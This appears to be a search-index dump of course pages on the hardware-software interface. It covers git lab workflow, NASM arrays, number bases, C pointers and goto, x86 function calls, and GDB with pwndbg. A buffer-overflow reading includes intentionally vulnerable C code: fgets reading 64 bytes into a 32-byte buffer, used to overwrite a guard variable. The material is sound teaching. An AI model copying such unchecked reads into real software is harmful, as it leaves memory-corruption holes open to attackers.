  },"196": {
    "doc": "Labs",
    "title": "Getting the Latest Changes",
    "content": "Each time you start a new laboratory, you should ensure you have the latest changes. If you have no local changes, you can simply run git pull and you are ready to go: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git checkout main # Change branch to main student@hsi:~/hardware-software-interface$ git status # Check if you have unstaged changes On branch main nothing to commit, working tree clean # \"working tree clean\" means that you have no changes student@hsi:~/hardware-software-interface$ git pull --rebase . If the git status output differs, follow the instructions to save your progress. ",
    "url": "/labs/README.html#getting-the-latest-changes",
    
    "relUrl": "/labs/README.html#getting-the-latest-changes"
  },"197": {
    "doc": "Labs",
    "title": "Save Progress and Prepare Next Lab",
    "content": ". | Check if you have unstaged changes that might be lost: . student@hsi:~$ cd hardware-software-interface student@hsi:~/hardware-software-interface$ git status On branch &lt;not-important&gt; Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) modified: main.c . If git status states “work tree clean”, you should follow the instructions to pull latest changes instead. | Create a commit to store your changes: . student@hsi:~/hardware-software-interface$ git add . student@hsi:~/hardware-software-interface$ git commit -m \"Store progress for lab X\" student@hsi:~/hardware-software-interface$ git status # double check that everything was committed On branch &lt;not-important&gt; nothing to commit, working tree clean . | Create a new branch for lab Y: . student@hsi:~/hardware-software-interface$ git checkout -b lab-Y main # Replace Y with lab number student@hsi:~/hardware-software-interface$ git pull origin main # Get latest changes from origin/main . | (Optional) Finding previous labs . Assuming you followed the instructions in this section, you can find your previous work on other branches: . student@hsi:~/hardware-software-interface$ git branch main lab-1 lab-2 * lab-3 student@hsi:~/hardware-software-interface$ git checkout lab-2 Switched to branch 'lab-2' . | . ",
    "url": "/labs/README.html#save-progress-and-prepare-next-lab",
    
    "relUrl": "/labs/README.html#save-progress-and-prepare-next-lab"
  },"198": {
    "doc": "Labs",
    "title": "Licensing and Contributing",
    "content": "The contents are open educational resources (OER), part of the Open Education Hub project; they are hosted on GitHub, licensed under CC BY-SA 4.0 and BSD 3-Clause. If you find an issue or want to contribute, follow the contribution guidelines on GitHub. ",
    "url": "/labs/README.html#licensing-and-contributing",
    
    "relUrl": "/labs/README.html#licensing-and-contributing"
  },"199": {
    "doc": "Reading: Structured Data - Arrays",
    "title": "Reading: Structured Data - Arrays",
    "content": " ",
    "url": "/labs/lab-06/reading/arrays.html",
    
    "relUrl": "/labs/lab-06/reading/arrays.html"
  },"200": {
    "doc": "Reading: Structured Data - Arrays",
    "title": "Arrays",
    "content": "We can consider an array as a sequence of elements of the same type, placed contiguously in memory. You might have noticed something similar in previous labs when declaring static character strings in the .data section. Declaring an Array . In general, declared static data can be initialized or uninitialized. Differentiation is made both by providing an initial value for initialized data and by the NASM syntax used. For example, to declare an array of 100 words initialized with the value 42, we will use the construction: . section .data my_vect: times 100 dw 42 . On the other hand, if we want to declare an uninitialized array of 20 double-word elements, we use instructions from the “res” family as follows: . section .bss my_vect: resd 20 . ",
    "url": "/labs/lab-06/reading/arrays.html#arrays",
    
    "relUrl": "/labs/lab-06/reading/arrays.html#arrays"
  },"201": {
    "doc": "Reading: Structured Data - Arrays",
    "title": "Arrays of Structures",
    "content": "Often, we’ll need arrays that contain elements larger than a double word. To achieve this, we’ll combine the two concepts presented earlier and use arrays of structures. Of course, string operation instructions will not work, so we’ll have to resort to the classic method of accessing elements: explicit memory addressing. For the example in this section, we create a structure representing a point in a 2D space. struc point .x: resd 1 .y: resd 1 endstruc . Declaring an Array of Structures . Since NASM doesn’t support any mechanism to explicitly declare an array of structures, we’ll need to effectively declare a data section to accommodate our array. Suppose we want a zero-initialized array of 100 elements of the structure type point (which is 8 bytes in size), we need to allocate 100 * 8 (= 800) bytes. We obtain: . section .data point_array: times 800 db 0 . In addition, NASM provides an alternative to manually calculating the size of a structure by automatically generating the macro &lt;structure name&gt;_size. Thus, the previous example can become: . section .data point_array: times point_size * 100 db 0 . If we want to declare an uninitialized array of structures, we can use: . section .bss point_array: resb point_size * 100 . Traversing an Array of Structures . As mentioned before, to access a field of an element in an array, we need to use normal addressing (particularly “based-indexed with scale” addressing). The formula to find the address of the element is base_of_array + i * size_of_struct. Assuming we have the start address of the array in the ebx register and the index of the element we want to access in the eax register, the following example demonstrates printing the value of the y field of this element. mov ebx, point_array ; Move the start address of the array into ebx mov eax, 13 ; Assume we want the 14th element mov edx, [ebx + point_size * eax + point.y] ; Calculate the address of the desired field between [] ; and then transfer the value from that address ; into the edx register PRINTF32 `%u\\n\\x0`, edx . We traverse the array, having the current index in the eax register at each iteration. We can print the values from both fields of each element in the array with the following program: . struc point .x: resd 1 .y: resd 1 endstruc section .data point_array: times point_size * 100 db 0 section .text global CMAIN CMAIN: push ebp mov ebp, esp xor edx, edx xor eax, eax label: mov edx, [point_array + point_size * eax + point.x] ; access x member PRINTF32 `%u\\n\\x0`, edx mov edx, [point_array + point_size * eax + point.y] ; access y member PRINTF32 `%u\\n\\x0`, edx inc eax ; increment input index cmp eax, 100 jl label leave ret . ",
    "url": "/labs/lab-06/reading/arrays.html#arrays-of-structures",
    
    "relUrl": "/labs/lab-06/reading/arrays.html#arrays-of-structures"
  },"202": {
    "doc": "Reading: Binary and Hexadecimal Systems",
    "title": "Reading: Binary and Hexadecimal Systems",
    "content": "For representing information (instructions and data), computers use the binary system (base 2). When writing programs in assembly language, the hexadecimal system (base 16) is preferred because it saves the programmer from writing long strings of 1s and 0s, and conversion to/from binary can be done much more easily than with the decimal system (base 10). NOTE: We’ll use the prefix 0b for representing numbers in binary and 0x for hexadecimal numbers. For example, we can write the unsigned integer 127 as 0b01111111 or 0x7F. ",
    "url": "/labs/lab-01/reading/binary-hex.html",
    
    "relUrl": "/labs/lab-01/reading/binary-hex.html"
  },"203": {
    "doc": "Reading: Binary and Hexadecimal Systems",
    "title": "Binary System",
    "content": "In the binary system (base 2), values are represented as a string of 0s and 1s. Each digit in the string represents a bit, and a group of 8 bits forms a byte. A group of 4 bits is called a nibble or half-byte. Operations with Values Represented in Binary . Arithmetic Operations . Arithmetic operations are the classic +, -, *, / (integer division), % (modulo). Fundamentally they work the same way in any base 10, 2, 16 etc. Just keep in mind what the maximum digit is for each of these bases so you know when to carry or subtract 1 to or from the higher-order digit of the result or operand. You can find a few examples of arithmetic operations in base 2 here . Logical Operations . Operators on Binary Values . | NOT Operation: Inverts each bit. | . Example: . INV(0b10011010) = 0b01100101 . | Logical AND Operation: Performs the ‘and’ operation between bits at the same positions in operands. | . Example: . 0b1001 AND 0b0111 = 0b0001 . | Logical OR Operation: Performs the ‘or’ operation between bits at the same positions in operands. | . Example: . 0b1001 OR 0b0111 = 0b1111 . | Exclusive OR (XOR) Operation: | . If bits at the same positions in operands have equal values, the resulting bit is 0; otherwise, it’s 1. Example: . 0b1001 XOR 0b0111 = 0b1110 . Logical Shifts . Logical shifts left/right involve moving each bit by one position. Since the result must be on the same number of bits as the initial value, the first bit is lost, and the empty space is filled with a 0 bit. For explanations related to bitwise operations in C, refer to the guide at Bitwise Operators in C. ",
    "url": "/labs/lab-01/reading/binary-hex.html#binary-system",
    
    "relUrl": "/labs/lab-01/reading/binary-hex.html#binary-system"
  },"204": {
    "doc": "Reading: Binary and Hexadecimal Systems",
    "title": "Hexadecimal System",
    "content": "In the hexadecimal system (base 16), values are represented as a string of characters from ‘0’ to ‘9’ or ‘a’ to ‘f’. A byte consists of two such characters, so each character corresponds to a group of 4 bits (a nibble). Conversion from Decimal to Binary/Hexadecimal . | Divide the number successively by the base number (2 or 16) and keep the remainders. | When the quotient of the division becomes 0, write down the remainders in reverse order. | In the case of base 16, when the remainder is greater than 9, letters a-f are used (0xa = 10, 0xf = 15). | . Example: Conversion of the number 0xD9B1 to decimal . \\[\\texttt{0xD9B1} = 1 \\cdot 16 ^ 0 + 11 \\cdot 16 ^ 1 + 9 \\cdot 16 ^ 2 + 13 \\cdot 16 ^ 3 = 55729\\] Conversion between Binary and Hexadecimal . As mentioned earlier, a digit in a hexadecimal number corresponds to a group of 4 bits (a nibble). Therefore, to convert a number from hexadecimal to binary, it’s sufficient to transform each digit into the equivalent 4-bit group. Example: Conversion of the number 0xD9B1 to binary . | 0x1 = 0b0001 | 0xB = 0b1011 | 0x9 = 0b1001 | 0xD = 0b1101 | . Thus, the resulting binary number is 0b1101100110110001. The reverse operation, conversion from binary to hexadecimal, can be done by converting each group of 4 bits into the corresponding digit in hexadecimal. Use of Base 16 Representation . The hexadecimal system is used to represent memory addresses and to visualize data in a more interpretable way than a sequence composed only of 0s and 1s. The image below provides an example in this regard: . (Image taken from Digital Detective) . ",
    "url": "/labs/lab-01/reading/binary-hex.html#hexadecimal-system",
    
    "relUrl": "/labs/lab-01/reading/binary-hex.html#hexadecimal-system"
  },"205": {
    "doc": "Reading: Binary and Hexadecimal Systems",
    "title": "Representation of Data Types",
    "content": "In a computer’s memory, a value is stored on a fixed number of bits. Depending on the architecture, each processor can access a maximum number of bits in a single operation, which represents the word size. The sizes of common data types used in C are dependent on both the processor and the platform on which the program was compiled (operating system, compiler). The table below presents the sizes of data types on a 32-bit architecture processor, when the program is compiled using gcc under Linux. On the left side of the image above, we have memory addresses where data is located. At address 0x0009FA08, the first 4 bytes starting from offset 0x02 are 0x01 0x00, 0xFF, 0xFF. These can represent a 4-byte integer, 4 characters, or 2 integers on 2 bytes. By using base 16, we can interpret the data and infer what they might represent. The table below shows the sizes of data types on a 32-bit processor. | Data Type | Number of Bits | Number of Bytes | . | char | 8 | 1 | . | short | 16 | 2 | . | int | 32 | 4 | . | size_t | 32 | 4 | . | long | 32 | 4 | . | long long | 64 | 8 | . | pointer | 32 | 4 | . On a 64-bit machine, the table above still holds true except for the types below. On 64-bit processors, addresses are 64 bits wide, which obviously affects the size of pointers and size_t. | Data Type | Number of Bits | Number of Bytes | . | size_t | 64 | 8 | . | long | 64 | 8 | . | pointer | 64 | 8 | . ",
    "url": "/labs/lab-01/reading/binary-hex.html#representation-of-data-types",
    
    "relUrl": "/labs/lab-01/reading/binary-hex.html#representation-of-data-types"
  },"206": {
    "doc": "Reading: Binary and Hexadecimal Systems",
    "title": "Order of Representation for Numbers Larger than One Byte (Little-Endian vs Big-Endian)",
    "content": "For representing values larger than one byte, there are two possible methods, both used in practice: . | Little-Endian: The least significant byte is stored first (bytes are stored in reverse order). This model is used by the Intel x86 processor family. | Big-Endian: The most significant byte is stored first. | . Example: We want to store the value 0x4a912480 in memory on 32 bits (4 bytes), starting at address 0x100, using both methods: . | Method | Address 0x100 | Address 0x101 | Address 0x102 | Address 0x103 | . | Little-Endian | 0x80 | 0x24 | 0x91 | 0x4a | . | Big-Endian | 0x4a | 0x91 | 0x24 | 0x80 | . ",
    "url": "/labs/lab-01/reading/binary-hex.html#order-of-representation-for-numbers-larger-than-one-byte-little-endian-vs-big-endian",
    
    "relUrl": "/labs/lab-01/reading/binary-hex.html#order-of-representation-for-numbers-larger-than-one-byte-little-endian-vs-big-endian"
  },"207": {
    "doc": "Reading: Introduction to Buffers",
    "title": "Reading: Introduction to Buffers",
    "content": "This laboratory aims to present the concept of buffers in C and assembly language along with their specific operations, as well as the vulnerabilities they pose and how they can be exploited by a potential attacker using a program to attack a system or obtain information to which they would not normally have access. ",
    "url": "/labs/lab-10/reading/buffers-intro.html",
    
    "relUrl": "/labs/lab-10/reading/buffers-intro.html"
  },"208": {
    "doc": "Reading: Introduction to Buffers",
    "title": "Objectives",
    "content": ". | Introducing the concepts of buffers and buffer overflow | Examples of buffer overflow attacks | Presentation of ways to secure programs to prevent buffer overflow attacks | . ",
    "url": "/labs/lab-10/reading/buffers-intro.html#objectives",
    
    "relUrl": "/labs/lab-10/reading/buffers-intro.html#objectives"
  },"209": {
    "doc": "Reading: Introduction to Buffers",
    "title": "Buffer. Buffer Overflow",
    "content": "What is a Buffer? . A buffer is a memory area defined by a start address and a size. Let N be the size of the buffer, for example, the number of elements. The total size of the buffer is N times the size of one element. A string is a specific case of a buffer. What is a Buffer Overflow? . A buffer overflow occurs when the upper limit of a buffer is exceeded during traversal, for example, the position of the last element (v[N - 1]). A buffer overflow is a specific case of an index out of bounds, where the vector can be accessed using negative indices. Many functions in C do not check the size of the buffers they work with, leading to buffer overflow errors when called. Some examples of such functions are: . | memcpy | strcpy | fgets | . A classic example of a buffer overflow is shown in the following code: . char buffer[32]; fgets(buffer, 64, stdin); . Executing this code will result in a buffer overflow, potentially leading to a Segmentation Fault error, although this is not guaranteed. Everything depends on the buffer’s position in the stack and what will be overwritten by the 32 bytes that exceed the buffer’s size. More details on what will be overwritten and how this will be done will be discovered when solving the proposed exercises. How to make a Buffer Overflow? . In the previous example we see that we can use a buffer to write more than “we should”. But what exactly can we do with this? In the following example we can use fgets() to overwrite very_important_var and enter jackpot() function. All we have to do is change the value of very_important_var to 0xDEADCODE, when reading the buffer. int very_important_var = 0xDEADBEEF; char buffer[32]; fgets(buffer, 64, stdin); if (very_important_var == 0xDEADC0DE) { jackpot(); } . Infrastructure Preparation . Throughout the laboratory, in the command-line, we will use: . | nasm assembler | gcc command as a linker | objdump and ghidra for disassembling object and executable files | gdb for dynamic analysis, investigation, and debugging | . This setup will allow us to perform assembly programming, linking, disassembly, and dynamic analysis using the specified tools in the command-line environment. ",
    "url": "/labs/lab-10/reading/buffers-intro.html#buffer-buffer-overflow",
    
    "relUrl": "/labs/lab-10/reading/buffers-intro.html#buffer-buffer-overflow"
  },"210": {
    "doc": "Reading: C basics - GOTOs",
    "title": "Reading: C basics - GOTOs",
    "content": "A less addressed concept in C tutorials is the goto statement. Using the goto statement, a program can jump to intermediate points within a function. These intermediate points are called labels. ",
    "url": "/labs/lab-03/reading/c-goto-statements.html",
    
    "relUrl": "/labs/lab-03/reading/c-goto-statements.html"
  },"211": {
    "doc": "Reading: C basics - GOTOs",
    "title": "Syntax",
    "content": "Syntax-wise, a label consists of a name followed by the character :. Code example: . #include &lt;stdio.h&gt; int main() { int i, j, k; /* some code */ do_some_work: /* some other code */ work(); if (any_work()) goto do_some_work; /* some code */ return 0; } . The program executes a job through the work() function. In case there are other unfinished jobs, the program execution jumps to the label do_some_work. do_some_work marks the point in the program where the processing of a new job begins. To jump to this point, the goto statement followed by the declared label name is used. Through different combinations of if statements and goto statements, other C instructions such as else, for, and while can be emulated. The example code given above could be replaced with do { … } while ();: . #include &lt;stdio.h&gt; int main() { int i, j, k; /* some code */ do { /* some other code */ work(); } while (any_work()); /* some code */ return 0; } . ",
    "url": "/labs/lab-03/reading/c-goto-statements.html#syntax",
    
    "relUrl": "/labs/lab-03/reading/c-goto-statements.html#syntax"
  },"212": {
    "doc": "Reading: C basics - GOTOs",
    "title": "The “WHYs” of goto",
    "content": "Not only is this instruction missing in many C tutorials, but recommendations are made against using it because it often leads to obfuscated code (difficult to understand, maintain, and debug). However, there are cases where it is used. In the Linux kernel code, for example, goto instructions are used as a form of try-catch from higher-level languages (such as C++, Java, C#, etc.). Example: . int process_data_from_mouse_device(...) { int err; int x, y; /* &gt;&gt;try&lt;&lt; instructions */ err = init_communication_with_mouse(); if (err) goto error; err = get_x_coord_from_mouse(&amp;x); if (err) goto error; err = get_y_coord_from_mouse(&amp;y); if (err) goto error; err = announce_upper_layers_of_mouse_movement(x, y); if (err) goto error; err = close_communication_with_mouse(); if (err) goto error; return 0; /* &gt;&gt;catch&lt;&lt; instructions' exceptions */ error: print_message(\"Failed to get data from mouse device. Error = %d\", err); return err; } . This code attempts to process data coming from a mouse and pass it to other higher-level parts of the kernel that could use it. In case an error occurs, an error message is displayed, and the data processing is terminated. The code seems correct but is not complete. It’s incomplete because if an error occurs in the middle of the function, communication with the mouse is left open. An improved version would be the following: . int process_data_from_mouse_device(...) { int err; int x, y; /* &gt;&gt;try&lt;&lt; instructions */ err = init_communication_with_mouse(); if (err) goto error; err = get_x_coord_from_mouse(&amp;x); if (err) goto error_close_connection; err = get_y_coord_from_mouse(&amp;y); if (err) goto error_close_connection; err = announce_upper_layers_of_mouse_movement(x, y); if (err) goto error_close_connection; err = close_communication_with_mouse(); if (err) goto error; return 0; /* &gt;&gt;catch&lt;&lt; instructions' exceptions */ error_close_connection: close_communication_with_mouse(); error: print_message(\"Failed to get data from mouse device. Error = %d\", err); return err; } . In the improved version, if an error occurs, a cleanup part is also performed: the connection with the mouse will be closed, and then the code will continue with the general error handling of any errors in the program (displaying an error message). NOTE: Why does this course/lab cover such a topic? . When we study assembly language, we will notice that a large portion of the workflow resembles a program made up of goto statements, even though most instructions of a high-level language, such as C, are nonexistent. Thinking in terms of goto statements and including them in our code prepares us for working in assembly language. WARNING: In any other situation, this form of programming should be avoided as much as possible. ",
    "url": "/labs/lab-03/reading/c-goto-statements.html#the-whys-of-goto",
    
    "relUrl": "/labs/lab-03/reading/c-goto-statements.html#the-whys-of-goto"
  },"213": {
    "doc": "Reading: Pointers in C",
    "title": "Reading: Pointers in C",
    "content": "In the C language, a pointer is a variable whose value is the address of another variable. We can think of a pointer as an intermediary, namely a variable that points to a final location or to another intermediary as shown in the image and code below. #include &lt;stdio.h&gt; int main() { int v; int *p; /* pointer to a 32-bit integer */ int **pp; /* pointer to a pointer holding the address of a 32-bit integer */ /* To access the address of a variable in C, we use the address-of operator '&amp;' */ p = &amp;v; /* p holds the address of value v */ pp = &amp;p; /* pp holds the address of the address of value v */ v = 69; /* To access the value at the address stored by a pointer, we use the dereference operator '*' */ printf(\"v(%d) - *p(%d) - **pp(%d)\\n\", v, *p, *(*pp)); /* outputs v(69) - *p(69) - **pp(69) */ return 0; } . ",
    "url": "/labs/lab-01/reading/c-pointers.html",
    
    "relUrl": "/labs/lab-01/reading/c-pointers.html"
  },"214": {
    "doc": "Reading: Pointers in C",
    "title": "Advantages of Pointers",
    "content": ". | Pointers are used in creating complex data structures such as linked lists, trees, graphs, hash tables, etc. | Pointers are used to transfer information between different functions or recursive calls without using global variables. | By using pointers, we can dynamically allocate memory. | We can have other functions, strings, complex data structures as parameters for functions. | . ",
    "url": "/labs/lab-01/reading/c-pointers.html#advantages-of-pointers",
    
    "relUrl": "/labs/lab-01/reading/c-pointers.html#advantages-of-pointers"
  },"215": {
    "doc": "Reading: Pointers in C",
    "title": "Disadvantages of Pointers",
    "content": ". | Using an uninitialized pointer in a program leads to a segmentation fault by accessing a restricted memory area. | Manual memory deallocation is required by the programmer for dynamically allocated memory. | Dereferencing is needed to access a value, which is slower than direct access. | . In C, a pointer can be defined for any of the data types existing in the language as well as for void. A void pointer differs from a pointer to an explicit data type in that a void pointer CANNOT be used in pointer operations, as void does not have a clear size. A basic example where pointers and pointer operations are used is the allocation and traversal of an array of values: . #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define ARR_LENGTH 5 int main() { int *arr, i; arr = (int *)malloc(sizeof(int) * ARR_LENGTH); // arr = (int *)calloc(ARR_LENGTH, sizeof(int)); for (i = 0; i &lt; ARR_LENGTH; ++i) { /* * arr + i iterates through the addresses of each element in the array, but the address arr + i doesn't increase by i but by i * sizeof(int), as arr is a pointer to int * This operation is not visible or necessary in C but will be required later in assembly language */ printf(\"arr[%d] = %d: \", i, *(arr + i)); } free(arr); return 0; } . Pointers offer great flexibility regarding memory access. Below is an example that checks if a system is little or big endian using casting between different types of pointers. #include &lt;stdio.h&gt; int main() { int v = 0x00000001; unsigned char *first_byte = (unsigned char *)&amp;v; if (*first_byte == 0x01) printf(\"little-endian\\n\"); else printf(\"big-endian\\n\"); return 0; } . ",
    "url": "/labs/lab-01/reading/c-pointers.html#disadvantages-of-pointers",
    
    "relUrl": "/labs/lab-01/reading/c-pointers.html#disadvantages-of-pointers"
  },"216": {
    "doc": "Reading: Functions",
    "title": "Reading: Functions",
    "content": "In this lab, we’ll discuss how function calls are performed. We’ll see how we can use the call and ret instructions to make function calls and how we use the stack to pass function parameters. ",
    "url": "/labs/lab-08/reading/functions.html",
    
    "relUrl": "/labs/lab-08/reading/functions.html"
  },"217": {
    "doc": "Reading: Functions",
    "title": "Passing Parameters",
    "content": "When it comes to calling a function with parameters, there are two major options for placing them: . | Register Passing - this method intuitively involves passing parameters through registers. Advantages: . | It is very easy to use when the number of parameters is small. | It is very fast since parameters are immediately accessible from registers. | . Disadvantages: . | Because there is a limited number of registers, the number of parameters for a function becomes limited. | It’s very likely that some registers are used inside the called function, and it becomes necessary to temporarily save registers on the stack before the function call. Thus, the second advantage listed disappears because accessing the stack involves working with memory, meaning increased latency. | . | Stack Passing - this method involves pushing all parameters onto the stack. Advantages: . | A large number of parameters can be passed. | . Disadvantages: . | It’s slow because it involves memory access. | More complicated in terms of parameter access. | . | . NOTE: For 32-bit architectures, the stack passing method is used, while for 64-bit architectures, the register passing method is used for the first 6 arguments. Starting from the 7th, the stack has to be used. We will use the convention for 32-bit architecture. ",
    "url": "/labs/lab-08/reading/functions.html#passing-parameters",
    
    "relUrl": "/labs/lab-08/reading/functions.html#passing-parameters"
  },"218": {
    "doc": "Reading: Functions",
    "title": "Function Call",
    "content": "When we call a function, the steps are as follows: . | We put the arguments on the stack, pushing them in the reverse order in which they are sent as function arguments. | We call call. | We restore the stack at the end of the call. | . Stack Operation . As we know, stack operations fall into two types: . | push val where the value val is placed on the stack | pop reg/mem where what is on the top of the stack is placed into a register or memory area | . When we push, we say that the stack grows (elements are added). For reasons that will be better explained later, the stack pointer (indicated by the esp register in 32-bit mode) decreases in value when the stack grows (on push). However, this contradiction in naming comes from the fact that the stack is typically represented vertically, with smaller values at the top and larger values at the bottom. Similarly, when we pop, we say that the stack shrinks (elements are removed). Now the stack pointer (indicated by the esp register in 32-bit mode) increases in value. A summary of this is explained very well here. For example, if we have the function foo with the following signature (in C language): . int foo(int a, int b, int c); . The call to this function will look like this: . mov ecx, [c] ; take the value of parameter c from a memory location mov ebx, [b] mov eax, [a] push ecx ; put parameters in reverse order, starting with c push ebx ; then b push eax ; then a call foo ; call the function add esp, 12 ; restore the stack . ",
    "url": "/labs/lab-08/reading/functions.html#function-call",
    
    "relUrl": "/labs/lab-08/reading/functions.html#function-call"
  },"219": {
    "doc": "Reading: Functions",
    "title": "Caller and Callee",
    "content": "When we call a function, we say that the calling function (the context that calls) is the caller, while the called function is the callee. In the previous paragraph, we discussed how things look at the caller level (how we build the stack). Now let’s see what happens at the callee level. Until the call instruction, the stack contains the function’s parameters. The call can be roughly equated to the following sequence: . push eip jmp function_name . That is, even the call uses the stack and saves the address of the next instruction, the one after the call, also known as the return address. This is necessary for the callee to know where to return to in the caller. In the callee, at its beginning (called preamble), the frame pointer is saved (in the i386 architecture, this is the ebp register), with the frame pointer then referring to the current function stack frame. This is crucial for accessing parameters and local variables via an offset from the frame pointer. Although not mandatory, saving the frame pointer helps in debugging and is used in most cases. For these reasons, any function call will generally have a preamble: . push ebp mov ebp, esp . These modifications take place in the callee. Therefore, it is the responsibility of the callee to restore the stack to its old value. Hence, it is customary to have an epilogue that restores the stack to its initial state; this epilogue is: . leave . After this instruction, the stack is as it was at the beginning of the function (immediately after the call). It is equivalent to the following code, which undoes the functions’s preamble: . mov esp, ebp pop ebp . To conclude the function, it is necessary for the execution to return and continue from the instruction following the call that started the function. This involves influencing the eip register and putting back the value that was saved on the stack initially by the call instruction. This is achieved using the instruction: . ret . which is roughly equivalent to the instruction: . pop eip . For example, the definition and body of the function foo, which calculates the sum of 3 numbers, would look like this: . foo: push ebp mov ebp, esp mov eax, [ebp + 8] mov ebx, [ebp + 12] mov ecx, [ebp + 16] add eax, ebx add eax, ecx leave ret . Remarks . | A function is defined by a label. | After the function’s preamble, the stack looks as follows: . | Note that during the execution of the function, what does not change is the position of the frame pointer. This is the reason for its name: it points to the current function’s frame. Therefore, it is common to access a function’s parameters through the frame pointer. Assuming a 32-bit system and processor word-sized parameters (32 bits, 4 bytes), we will have: . | the first argument is found at address ebp+8 | the second argument is found at address ebp+12 | the third argument is found at address ebp+16 | etc. | . This is why, to get the parameters of the foo function in the eax, ebx, ecx registers, we use the constructions: . mov eax, dword [ebp+8] ; first argument in eax mov ebx, dword [ebp+12] ; second argument in ebx mov ecx, dword [ebp+16] ; third argument in ecx . | The return value of a function is placed in registers (generally in eax). | If the return value is 8 bits, the function’s result is placed in al. | If the return value is 16 bits, the function’s result is placed in ax. | If the return value is 32 bits, the function’s result is placed in eax. | If the return value is 64 bits, the result is placed in the edx and eax registers. The most significant 32 bits are placed in edx, and the rest in the eax register. | . Additionally, in some cases, a memory address can be returned to the stack/heap (e.g. malloc()), or other memory areas, which refer to the desired object after the function call. | A function uses the same hardware registers; therefore, when exiting the function, the values of the registers are no longer the same. To avoid this situation, some/all registers can be saved on the stack. You can push all registers to the stack using the pusha instruction - “push all”. And you can pop them all in the same order using popa. The disadvantage of doing so is that writing all registers to the stack is going to be slower than only explicitly saving the registers used by the function. For this reason, the cdecl calling convention specifies that functions are allowed to change the values of the eax, ecx and edx registers. | . NOTE: Since assembly languages offer more opportunities, there is a need for calling conventions in x86. The difference between them may consist of the parameter order, how the parameters are passed to the function, which registers need to be preserved by the callee or whether the caller or callee handles stack preparation. More details can be found here or here if Wikipedia is too mainstream for you. For us, the registers eax, ecx, edx are considered clobbered (or volatile), and the callee can do whatever it wants to them. On the other hand, the callee has to ensure that ebx exits the function with the same value it has entered with. ",
    "url": "/labs/lab-08/reading/functions.html#caller-and-callee",
    
    "relUrl": "/labs/lab-08/reading/functions.html#caller-and-callee"
  },"220": {
    "doc": "Hardware Software Interface (OER)",
    "title": "Hardware Software Interface (OER)",
    "content": ". ",
    "url": "/",
    
    "relUrl": "/"
  },"221": {
    "doc": "Hardware Software Interface (OER)",
    "title": "Content",
    "content": "The contents are open educational resources (OER), part of the Open Education Hub project; they are hosted on GitHub, licensed under CC BY-SA 4.0 and BSD 3-Clause. Lab content consists of lab text and lab activities. Lab text is placed in the README.md file. Each lab activity has its own folder with source code, Makefile or other build files (if required) and support files. ",
    "url": "/#content",
    
    "relUrl": "/#content"
  },"222": {
    "doc": "Hardware Software Interface (OER)",
    "title": "Contributing",
    "content": "Contributions are welcome. See the contribution guide on how you could report or fix issues and on how you can improve the content. Reviewers are requested to follow the reviewing guide. ",
    "url": "/#contributing",
    
    "relUrl": "/#contributing"
  },"223": {
    "doc": "Reading: GNU Debugger (GDB)",
    "title": "Reading: GNU Debugger (GDB)",
    "content": " ",
    "url": "/labs/lab-02/reading/introduction-to-GDB.html",
    
    "relUrl": "/labs/lab-02/reading/introduction-to-GDB.html"
  },"224": {
    "doc": "Reading: GNU Debugger (GDB)",
    "title": "Starting GDB",
    "content": "GDB is a powerful tool for debugging programs. It allows you to inspect the state of a program at a certain point in its execution, set breakpoints, and step through the code, among other things. To start GDB, you need to run the following command: . gdb [program_name] . ",
    "url": "/labs/lab-02/reading/introduction-to-GDB.html#starting-gdb",
    
    "relUrl": "/labs/lab-02/reading/introduction-to-GDB.html#starting-gdb"
  },"225": {
    "doc": "Reading: GNU Debugger (GDB)",
    "title": "Running the Program",
    "content": "To run the program being debugged, there are two available commands: . | r or run - this command will run the program | start - unlike run, this command will start the program but immediately stop after entering main, it is equivalent to setting a breakpoint at main and then running the program | . ",
    "url": "/labs/lab-02/reading/introduction-to-GDB.html#running-the-program",
    
    "relUrl": "/labs/lab-02/reading/introduction-to-GDB.html#running-the-program"
  },"226": {
    "doc": "Reading: GNU Debugger (GDB)",
    "title": "Breakpoints",
    "content": "The essential element of GDB is the breakpoint. Essentially, setting a breakpoint at a certain instruction causes the program’s execution to halt every time it reaches that point. Setting a breakpoint is done with the following command: . break [location] . or in short form: . b [location] . where location can represent the name of a function, the line number of the code, or even a memory address, in which case the address must be preceded by the symbol *. For example: break \\*0xCAFEBABE . ",
    "url": "/labs/lab-02/reading/introduction-to-GDB.html#breakpoints",
    
    "relUrl": "/labs/lab-02/reading/introduction-to-GDB.html#breakpoints"
  },"227": {
    "doc": "Reading: GNU Debugger (GDB)",
    "title": "Stepping through instructions",
    "content": ". | si or stepi - executes the current instruction | ni or nexti - similar to stepi, but if the current instruction is a function call, the debugger will not enter the function | c or continue - continues program execution until the next breakpoint or until it finishes | finish - continues program execution until leaving the current function | . ",
    "url": "/labs/lab-02/reading/introduction-to-GDB.html#stepping-through-instructions",
    
    "relUrl": "/labs/lab-02/reading/introduction-to-GDB.html#stepping-through-instructions"
  },"228": {
    "doc": "Reading: GNU Debugger (GDB)",
    "title": "Inspecting Memory",
    "content": ". | p or print var - displays the value of var. Print is a very flexible command, allowing dereferencing of pointers, displaying addresses of variables, and indexing through arrays using *, &amp; and []. The print command can be followed by the /f parameter specifying the display format (x for hex, d for decimal, s for string). | x or examine - Inspects the content at the given address. The usage of this command is as follows: | . x/nfu address . where: . | n is the number of displayed elements | f is the display format (x for hex, d for decimal, s for string, and i for instructions) | u is the size of each element (b for 1 byte, h for 2, w for 4, and g for 8 bytes) | . We recommend the article Debugging for further understanding of how to use GDB both in the CLI and through an IDE. ",
    "url": "/labs/lab-02/reading/introduction-to-GDB.html#inspecting-memory",
    
    "relUrl": "/labs/lab-02/reading/introduction-to-GDB.html#inspecting-memory"
  },"229": {
    "doc": "Reading: GNU Debugger (GDB)",
    "title": "pwndbg",
    "content": "pwndbg is a GDB plugin that provides a number of useful features for debugging and exploiting binaries. It makes GDB easier to use and infinitely more powerful. It will become more useful as we progress through the lab sessions. Cheatsheet gdb + pwndbg; pwndbg features . pwndbg&gt; show context-sections 'regs disasm code ghidra stack backtrace expressions' # for smaller terminals pwndbg&gt; set context-sections 'regs code stack' # display memory area in hex + ASCII pwndbg&gt; hexdump $ecx # display stack pwndbg&gt; stack # permanently display memory dump of 8 bytes pwndbg&gt; ctx-watch execute \"x/8xb &amp;msg\" # recommended settings in .gdbinit set context-sections 'regs code expressions' set show-flags on set dereference-limit 1 . ",
